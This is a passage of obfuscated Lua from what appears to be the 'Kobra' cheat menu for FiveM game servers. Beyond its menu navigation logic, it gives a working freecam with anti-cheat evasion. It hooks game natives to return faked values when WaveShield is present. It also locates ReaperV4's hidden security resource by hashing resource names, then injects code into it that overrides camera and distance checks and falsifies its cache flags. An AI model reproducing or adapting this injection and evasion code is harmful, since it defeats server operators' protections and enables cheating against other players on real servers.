(v894==(0 -0)) then v189.value=v189.value or v189.min or (1710 -(1596 + 114)) ;v895=v189.step or (2 -1) ;v894=714 -(164 + 549) ;end if (v894==2) then v186:UpdateElements(v17);if ((v189.scrollType=="onScroll") and v189.onSelect) then if (v189.type=="slider-checkbox") then v189.onSelect(v189.value,v189.checked or false );else v189.onSelect(v189.value);end end break;end if (1==v894) then if (v187=="Left") then v189.value=math.max(v189.min or (1438 -(1059 + 379)) ,v189.value-v895 );elseif (v187=="Right") then v189.value=math.min(v189.max or (124 -24) ,v189.value + v895 );end for v1152,v1153 in pairs(v25) do if ((v1153.type=="slider-checkbox") and (type(v1153.value)~="nil") and (v1153.label==v189.label)) then if (v187=="Left") then v1153.value=math.max(v189.min or (0 + 0) ,v189.value-v895 );elseif (v187=="Right") then v1153.value=math.min(v189.max or 100 ,v189.value + v895 );else return;end end end v894=2;end end end break;end if (v188==0) then v189=v17[v15];if  not v189 then return;end v188=1;end end end;v12.Enter=function(v190) if ( not v17 or ( #v17==0)) then return;end local v191=v17[v15];if  not v191 then return;end if  not v24 then return;end if (v191.type=="subMenu") then local v506=0 + 0 ;while true do if (v506==(392 -(145 + 247))) then table.insert(v20,{menu=v17,categories=v18,categoryIndex=v19});table.insert(v21,v191.label or "Submenu" );v506=1 + 0 ;end if (v506==(1 + 1)) then if (v191.subTabs and (type(v191.subTabs)=="table") and ( #v191.subTabs>(0 -0))) then local v896=0 + 0 ;while true do if (v896==(0 + 0)) then v18=nil;v19=1 -0 ;v896=721 -(254 + 466) ;end if (v896==(561 -(544 + 16))) then v17=v191.subTabs;v15=2 -1 ;v896=630 -(294 + 334) ;end if (v896==2) then v190:UpdateElements(v17);return;end end end return;end if (v506==(254 -(236 + 17))) then if (v191.type=="Server") then v12:UpdateListMenu();end if (v191.categories and (type(v191.categories)=="table") and ( #v191.categories>(0 + 0))) then local v897=0;while true do if (v897==(0 + 0)) then v18=v191.categories;v19=3 -2 ;v897=1;end if (v897==(4 -3)) then v17=v18[v19].tabs or {} ;v15=1 + 0 ;v897=2 + 0 ;end if (v897==(796 -(413 + 381))) then v190:UpdateElements(v17);return;end end end v506=1 + 1 ;end end end if ((v191.type=="button") and v191.onSelect and (type(v191.onSelect)=="function")) then local v507=0 -0 ;local v508;local v509;while true do if (v507==(2 -1)) then return;end if (v507==0) then v508,v509=pcall(v191.onSelect);if  not v508 then v190:Debug("red","onSelect error: "   .. tostring(v509) );end v507=1971 -(582 + 1388) ;end end end if ((v191.type=="checkbox") or (v191.type=="scrollable-checkbox") or (v191.type=="slider-checkbox")) then if v191.locked then v190:Notify("error","Kobra","This module has been disabled due to high detection rates!",5111 -2111 );return;end if (type(v191.checked)~="boolean") then v191.checked=true;else v191.checked= not v191.checked;end if (v191.onSelect and (type(v191.onSelect)=="function")) then if (v191.type=="scrollable-checkbox") then local v853,v854=pcall(v191.onSelect,v191.values[v191.value],v191.checked);if  not v853 then v190:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v854) );end elseif (v191.type=="slider-checkbox") then local v962,v963=pcall(v191.onSelect,v191.value,v191.checked);if  not v962 then v190:Debug("red","slider-checkbox onSelect error: "   .. tostring(v963) );end else local v964=0;local v965;local v966;while true do if (v964==(0 + 0)) then v965,v966=pcall(v191.onSelect,v191.checked);if  not v965 then v190:Debug("red","checkbox onSelect error: "   .. tostring(v966) );end break;end end end end v190:UpdateElements(v17);return;end if ((v191.type=="scrollable") or (v191.type=="scrollable-checkbox")) then local v510=364 -(326 + 38) ;while true do if ((0 -0)==v510) then if (v191.values and (type(v191.values)=="table") and ( #v191.values>(0 -0))) then if v191.onSelect then v191.onSelect(v191.values[v191.value]);end end return;end end end if ((v191.type=="slider") or (v191.type=="slider-checkbox")) then local v511=620 -(47 + 573) ;while true do if (v511==(0 + 0)) then if ((v191.scrollType=="onEnter") and v191.onSelect) then if (v191.type=="slider-checkbox") then v191.onSelect(v191.value,v191.checked or false );else v191.onSelect(v191.value);end end return;end end end end;local v64=false;v12.Backspace=function(v192) if ( #v20>(0 -0)) then local v512=0 -0 ;local v513;while true do if (v512==(1664 -(1269 + 395))) then v513=table.remove(v20);table.remove(v21);v512=493 -(76 + 416) ;end if (v512==(444 -(319 + 124))) then v17=v513.menu or v16 ;v18=v513.categories;v512=2;end if ((4 -2)==v512) then v19=v513.categoryIndex or 1 ;v15=1008 -(564 + 443) ;v512=3;end if (v512==(7 -4)) then v192:UpdateElements(v17);break;end end else v192:HideUI();end end;v12.PrevCategory=function(v193) local v194=0;while true do if (v194==(459 -(337 + 121))) then if (v19<1) then v19= #v18;end v17=v18[v19].tabs or {} ;v194=2;end if (v194==3) then v193:SendMessage({action="keydown",index=v15-1 });break;end if ((0 -0)==v194) then if ( not v18 or ( #v18==(0 -0))) then return;end v19=v19-1 ;v194=1912 -(1261 + 650) ;end if ((1 + 1)==v194) then v15=1;v193:UpdateElements(v17);v194=3 -0 ;end end end;v12.NextCategory=function(v195) if ( not v18 or ( #v18==0)) then return;end v19=v19 + 1 ;if (v19> #v18) then v19=1818 -(772 + 1045) ;end v17=v18[v19].tabs or {} ;v15=1;v195:UpdateElements(v17);v195:SendMessage({action="keydown",index=v15-(1 + 0) });end;v12.ToggleFreecam=function(v196,v197,v198) if (type(v197)~="boolean") then return;end if v197 then local v514=0;while true do if (v514==(145 -(102 + 42))) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000 -(1524 + 320) ,function(...) return false, -(1271 -(1049 + 221));end);MachoHookNative(11673589000000000000 -(18 + 138) ,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000 -0 ,function(...) return false,false;end);MachoHookNative(10181871000000000000 -(67 + 1035) ,function(...) return false,348 -(136 + 212) ;end);MachoHookNative(12777102000000000000 -0 ,function(...) return false,false;end);MachoHookNative(1858573000000000000 -(66 + 736) ,function(...) return false,1604 -(240 + 1364) ;end);MachoHookNative(15349248000000000000,function(...) return false,1082 -(1050 + 32) ;end);MachoHookNative(18127728000000000000 -1792801554 ,function(...) return false,true;end);MachoHookNative(11059360000000000000 -(331 + 724) ,function(...) return false,true;end);_G.KobraFreecamSpeed=v198;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1239,v1240) local v1241=0 + 0 ;local v1242;while true do if (v1241==(644 -(269 + 375))) then v1242=_G[v1239];if ( not v1242 or (type(v1242)~="function")) then return;end v1241=726 -(267 + 458) ;end if (v1241==(1 + 0)) then _G[v1239]=function(...) return v1240(v1242,...);end;break;end end end local function v1154(v1243) local v1244=math.rad(v1243.z);local v1245=math.rad(v1243.x);local v1246=math.abs(math.cos(v1245));return vector3( -math.sin(v1244) * v1246 ,math.cos(v1244) * v1246 ,math.sin(v1245));end local function v1155(v1247) local v1248=0 -0 ;local v1249;while true do if (v1248==0) then v1249=math.rad(v1247.z);return vector3(math.cos(v1249),math.sin(v1249),818 -(667 + 151) );end end end local function v1156(v1250,v1251,v1252) local v1253=0;while true do if (v1253==(1498 -(1410 + 87))) then return v1250;end if (v1253==(1897 -(1504 + 393))) then if (v1250<v1251) then return v1251;end if (v1250>v1252) then return v1252;end v1253=2 -1 ;end end end hNative("RotationToDirection",function(v1254,...) return v1254(...);end);hNative("GetRightVector",function(v1255,...) return v1255(...);end);hNative("Clamp",function(v1256,...) return v1256(...);end);hNative("CreateThread",function(v1257,...) return v1257(...);end);hNative("Wait",function(v1258,...) return v1258(...);end);hNative("IsVehicleSeatFree",function(v1259,...) return v1259(...);end);hNative("PlayerPedId",function(v1260,...) return v1260(...);end);hNative("GetEntityCoords",function(v1261,...) return v1261(...);end);hNative("CreateCam",function(v1262,...) return v1262(...);end);hNative("DoesCamExist",function(v1263,...) return v1263(...);end);hNative("SetCamCoord",function(v1264,...) return v1264(...);end);hNative("SetCamRot",function(v1265,...) return v1265(...);end);hNative("RenderScriptCams",function(v1266,...) return v1266(...);end);hNative("DestroyCam",function(v1267,...) return v1267(...);end);hNative("SetFocusEntity",function(v1268,...) return v1268(...);end);hNative("SetTextFont",function(v1269,...) return v1269(...);end);hNative("SetTextProportional",function(v1270,...) return v1270(...);end);hNative("SetTextScale",function(v1271,...) return v1271(...);end);hNative("SetTextDropShadow",function(v1272,...) return v1272(...);end);hNative("SetTextEdge",function(v1273,...) return v1273(...);end);hNative("SetTextOutline",function(v1274,...) return v1274(...);end);hNative("SetTextCentre",function(v1275,...) return v1275(...);end);hNative("SetTextColour",function(v1276,...) return v1276(...);end);hNative("BeginTextCommandDisplayText",function(v1277,...) return v1277(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1278,...) return v1278(...);end);hNative("EndTextCommandDisplayText",function(v1279,...) return v1279(...);end);hNative("GetCamCoord",function(v1280,...) return v1280(...);end);hNative("GetCamRot",function(v1281,...) return v1281(...);end);hNative("IsControlPressed",function(v1282,...) return v1282(...);end);hNative("GetDisabledControlNormal",function(v1283,...) return v1283(...);end);hNative("TaskStandStill",function(v1284,...) return v1284(...);end);hNative("SetFocusPosAndVel",function(v1285,...) return v1285(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1286,...) return v1286(...);end);hNative("GetShapeTestResult",function(v1287,...) return v1287(...);end);hNative("IsControlJustPressed",function(v1288,...) return v1288(...);end);hNative("IsDisabledControlJustPressed",function(v1289,...) return v1289(...);end);hNative("IsEntityAVehicle",function(v1290,...) return v1290(...);end);hNative("TaskWarpPedIntoVehicle",function(v1291,...) return v1291(...);end);hNative("SetEntityCoords",function(v1292,...) return v1292(...);end);hNative("GiveWeaponToPed",function(v1293,...) return v1293(...);end);hNative("SetCurrentPedWeapon",function(v1294,...) return v1294(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1295,...) return v1295(...);end);local v1157=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v1157.x,v1157.y,v1157.z + (5 -3) );SetCamRot(_G.KobraFreecamObject,796 -(461 + 335) ,0 + 0 ,GetEntityHeading(PlayerPedId()),1763 -(1730 + 31) );RenderScriptCams(true,false,1667 -(728 + 939) ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0);if _G.KobraFreecamObject then local v1387=GetCamCoord(_G.KobraFreecamObject);local v1388=GetCamRot(_G.KobraFreecamObject,2);local v1389=_G.KobraFreecamSpeed or 0.25 ;local v1390=(IsControlPressed(0,21) and (v1389 + (3 -2))) or v1389 ;local v1391=v1154(v1388);local v1392=v1155(v1388);local v1393,v1394,v1395=0 -0 ,0 -0 ,1068 -(138 + 930) ;TaskStandStill(PlayerPedId(),10 + 0 );SetFocusPosAndVel(v1387.x,v1387.y,v1387.z,0 + 0 ,0 + 0 ,0 -0 );if IsControlPressed(1766 -(459 + 1307) ,1902 -(474 + 1396) ) then v1393=v1393 + (v1391.x * v1390) ;v1394=v1394 + (v1391.y * v1390) ;v1395=v1395 + (v1391.z * v1390) ;end if IsControlPressed(0 -0 ,31 + 2 ) then local v1445=0 + 0 ;while true do if (v1445==(0 -0)) then v1393=v1393-(v1391.x * v1390) ;v1394=v1394-(v1391.y * v1390) ;v1445=1 + 0 ;end if (v1445==1) then v1395=v1395-(v1391.z * v1390) ;break;end end end if IsControlPressed(0,34) then local v1446=0;while true do if (v1446==(0 -0)) then v1393=v1393-(v1392.x * v1390) ;v1394=v1394-(v1392.y * v1390) ;break;end end end if IsControlPressed(0 -0 ,35) then v1393=v1393 + (v1392.x * v1390) ;v1394=v1394 + (v1392.y * v1390) ;end if IsControlPressed(0,613 -(562 + 29) ) then v1395=v1395 + v1390 ;end if IsControlPressed(0 + 0 ,36) then v1395=v1395-v1390 ;end SetCamCoord(_G.KobraFreecamObject,v1387.x + v1393 ,v1387.y + v1394 ,v1387.z + v1395 );local v1396=GetDisabledControlNormal(1419 -(374 + 1045) ,1);local v1397=GetDisabledControlNormal(0 + 0 ,5 -3 );local v1398=v1156(v1388.x-(v1397 * 5) , -(727 -(448 + 190)),29 + 60 );local v1399=v1388.z-(v1396 * 5) ;SetCamRot(_G.KobraFreecamObject,v1398,v1388.y,v1399,2);end end end);else _G.KobraFreecamEnabled=true;end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v198   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v30 then local v998=0 + 0 ;local v999;local v1000;while true do if (v998==(2 + 1)) then if v1000 then MachoInjectResource(v1000,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);v998=4;end if (v998==0) then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");v999=nil;v998=3 -2 ;end if (v998==(5 -3)) then MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(1744 -(1307 + 187) );v998=11 -8 ;end if (v998==(2 -1)) then function v999() local v1306=0 -0 ;local v1307;local v1308;local v1309;local v1310;local v1311;local v1312;local v1313;local v1314;while true do if ((684 -(232 + 451))==v1306) then v1309=GetConvar("reaper_security_resource","");v1310=tonumber(v1309);if  not v1310 then return;end v1306=2 + 0 ;end if (3==v1306) then if ( #v1312==(0 + 0)) then return;end v1313=564 -(510 + 54) ;v1314=nil;v1306=7 -3 ;end if (v1306==(40 -(13 + 23))) then for v1447,v1448 in ipairs(v1312) do v1313=v1313 + (1 -0) ;if (v1308(v1448)==v1310) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1448 );v1314=v1448;break;end local v1449=v1448:gsub("[-_]","");if ((v1449~=v1448) and (v1308(v1449)==v1310)) then v1314=v1449;break;end if ((v1313%50)==(0 -0)) then Wait(0 -0 );end end if v1314 then return v1314;end break;end if ((1088 -(830 + 258))==v1306) then v1307=false;v1308=nil;function v1308(v1450,v1451) local v1452=0;local v1453;while true do if (v1452==0) then v1451=v1451 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1450=v1450   .. v1451 ;v1452=3 -2 ;end if (v1452==(1 + 0)) then v1453=4579 + 802 ;for v1649=1, #v1450 do local v1650=0;local v1651;while true do if ((1441 -(860 + 581))==v1650) then v1651=string.byte(v1450,v1649);v1453=(v1453 * 33)~v1651 ;break;end end end v1452=7 -5 ;end if (v1452==(2 + 0)) then return v1453;end end end v1306=242 -(237 + 4) ;end if (v1306==(4 -2)) then v1311=GetNumResources() or (0 -0) ;v1312={};for v1454=0,v1311-1  do local v1455=0;local v1456;while true do if (v1455==0) then v1456=GetResourceByFindIndex(v1454);if (v1456 and (v1456~="")) then table.insert(v1312,v1456);end break;end end end v1306=3;end end end v1000=v999();v998=3 -1 ;end if (v998==4) then print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v30=true;break;end end end _G.KobraFreecamSpeed=v198;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1033,v1034) local v1035=_G[v1033];if ( not v1035 or (type(v1035)~="function")) then return;end _G[v1033]=function(...) return v1034(v1035,...);end;end local function v1001(v1036) local v1037=0 + 0 ;local v1038;local v1039;local v1040;while true do if (0==v1037) then v1038=math.rad(v1036.z);v1039=math.rad(v1036.x);v1037=1;end if (v1037==(1 + 0)) then v1040=math.abs(math.cos(v1039));return vector3( -math.sin(v1038) * v1040 ,math.cos(v1038) * v1040 ,math.sin(v1039));end end end local function v1002(v1041) local v1042=0 -0 ;local v1043;while true do if (v1042==0) then v1043=math.rad(v1041.z);return vector3(math.cos(v1043),math.sin(v1043),0 + 0 );end end end local function v1003(v1044,v1045,v1046) local v1047=0 + 0 ;while true do if (v1047==(1427 -(85 + 1341))) then return v1044;end if (v1047==(0 -0)) then if (v1044<v1045) then return v1045;end if (v1044>v1046) then return v1046;end v1047=2 -1 ;end end end hNative("RotationToDirection",function(v1048,...) return v1048(...);end);hNative("GetRightVector",function(v1049,...) return v1049(...);end);hNative("Clamp",function(v1050,...) return v1050(...);end);hNative("CreateThread",function(v1051,...) return v1051(...);end);hNative("Wait",function(v1052,...) return v1052(...);end);hNative("IsVehicleSeatFree",function(v1053,...) return v1053(...);end);hNative("PlayerPedId",function(v1054,...) return v1054(...);end);hNative("GetEntityCoords",function(v1055,...) return v1055(...);end);hNative("CreateCam",function(v1056,...) return v1056(...);end);hNative("DoesCamExist",function(v1057,...) return v1057(...);end);hNative("SetCamCoord",function(v1058,...) return v1058(...);end);hNative("SetCamRot",function(v1059,...) return v1059(...);end);hNative("RenderScriptCams",function(v1060,...) return v1060(...);end);hNative("DestroyCam",function(v1061,...) return v1061(...);end);hNative("SetFocusEntity",function(v1062,...) return v1062(...);end);hNative("SetTextFont",function(v1063,...) return v1063(...);end);hNative("SetTextProportional",function(v1064,...) return v1064(...);end);hNative("SetTextScale",function(v1065,...) return v1065(...);end);hNative("SetTextDropShadow",function(v1066,...) return v1066(...);end);hNative("SetTextEdge",function(v1067,...) return v1067(...);end);hNative("SetTextOutline",function(v1068,...) return v1068(...);end);hNative("SetTextCentre",function(v1069,...) return v1069(...);end);hNative("SetTextColour",function(v1070,...) return v1070(...);end);hNative("BeginTextCommandDisplayText",function(v1071,...) return v1071(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1072,...) return v1072(...);end);hNative("EndTextCommandDisplayText",function(v1073,...) return v1073(...);end);hNative("GetCamCoord",function(v1074,...) return v1074(...);end);hNative("GetCamRot",function(v1075,...) return v1075(...);end);hNative("IsControlPressed",function(v1076,...) return v1076(...);end);hNative("GetDisabledControlNormal",function(v1077,...) return v1077(...);end);hNative("TaskStandStill",function(v1078,...) return v1078(...);end);hNative("SetFocusPosAndVel",function(v1079,...) return v1079(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1080,...) return v1080(...);end);hNative("GetShapeTestResult",function(v1081,...) return v1081(...);end);hNative("IsControlJustPressed",function(v1082,...) return v1082(...);end);hNative("IsDisabledControlJustPressed",function(v1083,...) return v1083(...);end);hNative("IsEntityAVehicle",function(v1084,...) return v1084(...);end);hNative("TaskWarpPedIntoVehicle",function(v1085,...) return v1085(...);end);hNative("SetEntityCoords",function(v1086,...) return v1086(...);end);hNative("GiveWeaponToPed",function(v1087,...) return v1087(...);end);hNative("SetCurrentPedWeapon",function(v1088,...) return v1088(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1089,...) return v1089(...);end);local v1004=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v1004.x,v1004.y,v1004.z + (374 -(45 + 327)) );SetCamRot(_G.KobraFreecamObject,0 -0 ,502 -(444 + 58) ,GetEntityHeading(PlayerPedId()),1 + 1 );RenderScriptCams(true,false,0 + 0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 + 0 );if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1315=0 -0 ;local v1316;local v1317;local v1318;local v1319;local v1320;local v1321;local v1322;local v1323;local v1324;local v1325;local v1326;local v1327;local v1328;while true do if (v1315==(1735 -(64 + 1668))) then if IsControlPressed(1973 -(1227 + 746) ,35) then v1322=v1322 + (v1321.x * v1319) ;v1323=v1323 + (v1321.y * v1319) ;end if IsControlPressed(0,67 -45 ) then v1324=v1324 + v1319 ;end if IsControlPressed(0 -0 ,530 -(415 + 79) ) then v1324=v1324-v1319 ;end SetCamCoord(_G.KobraFreecamObject,v1316.x + v1322 ,v1316.y + v1323 ,v1316.z + v1324 );v1315=1 + 3 ;end if ((491 -(142 + 349))==v1315) then v1316=GetCamCoord(_G.KobraFreecamObject);v1317=GetCamRot(_G.KobraFreecamObject,2);v1318=_G.KobraFreecamSpeed or (0.25 + 0) ;v1319=(IsControlPressed(0 -0 ,21) and (v1318 + 1 + 0)) or v1318 ;v1315=1;end if ((2 + 0)==v1315) then SetFocusPosAndVel(v1316.x,v1316.y,v1316.z,0 -0 ,0,0);if IsControlPressed(0,1896 -(1710 + 154) ) then local v1522=318 -(200 + 118) ;while true do if (v1522==1) then v1324=v1324 + (v1320.z * v1319) ;break;end if (v1522==(0 + 0)) then v1322=v1322 + (v1320.x * v1319) ;v1323=v1323 + (v1320.y * v1319) ;v1522=1;end end end if IsControlPressed(0,33) then local v1523=0;while true do if (v1523==0) then v1322=v1322-(v1320.x * v1319) ;v1323=v1323-(v1320.y * v1319) ;v1523=1 -0 ;end if (v1523==(1 -0)) then v1324=v1324-(v1320.z * v1319) ;break;end end end if IsControlPressed(0,31 + 3 ) then local v1524=0 + 0 ;while true do if (v1524==(0 + 0)) then v1322=v1322-(v1321.x * v1319) ;v1323=v1323-(v1321.y * v1319) ;break;end end end v1315=3;end if (v1315==(1 + 4)) then SetCamRot(_G.KobraFreecamObject,v1327,v1317.y,v1328,4 -2 );break;end if (v1315==(1251 -(363 + 887))) then v1320=v1001(v1317);v1321=v1002(v1317);v1322,v1323,v1324=0,0,0 -0 ;TaskStandStill(PlayerPedId(),47 -37 );v1315=1 + 1 ;end if (v1315==(9 -5)) then v1325=GetDisabledControlNormal(0 + 0 ,1);v1326=GetDisabledControlNormal(1664 -(674 + 990) ,2);v1327=v1003(v1317.x-(v1326 * (2 + 3)) , -(37 + 52),89);v1328=v1317.z-(v1325 * (7 -2)) ;v1315=1060 -(507 + 548) ;end end end end end);else _G.KobraFreecamEnabled=true;end end break;end if (v514==(837 -(289 + 548))) then v32=true;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=true,weaponIndex=v34,vehicleIndex=v35}));v514=1;end end else local v515=1818 -(821 + 997) ;while true do if (v515==(256 -(195 + 60))) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1090,v1091) local v1092=0 + 0 ;local v1093;while true do if (v1092==(1502 -(251 + 1250))) then _G[v1090]=function(...) return v1091(v1093,...);end;break;end if ((0 -0)==v1092) then v1093=_G[v1090];if ( not v1093 or (type(v1093)~="function")) then return;end v1092=1 + 0 ;end end end hNative("CreateThread",function(v1094,...) return v1094(...);end);hNative("Wait",function(v1095,...) return v1095(...);end);hNative("IsVehicleSeatFree",function(v1096,...) return v1096(...);end);hNative("PlayerPedId",function(v1097,...) return v1097(...);end);hNative("GetEntityCoords",function(v1098,...) return v1098(...);end);hNative("CreateCam",function(v1099,...) return v1099(...);end);hNative("SetCamCoord",function(v1100,...) return v1100(...);end);hNative("SetCamRot",function(v1101,...) return v1101(...);end);hNative("RenderScriptCams",function(v1102,...) return v1102(...);end);hNative("DestroyCam",function(v1103,...) return v1103(...);end);hNative("SetFocusEntity",function(v1104,...) return v1104(...);end);hNative("SetTextFont",function(v1105,...) return 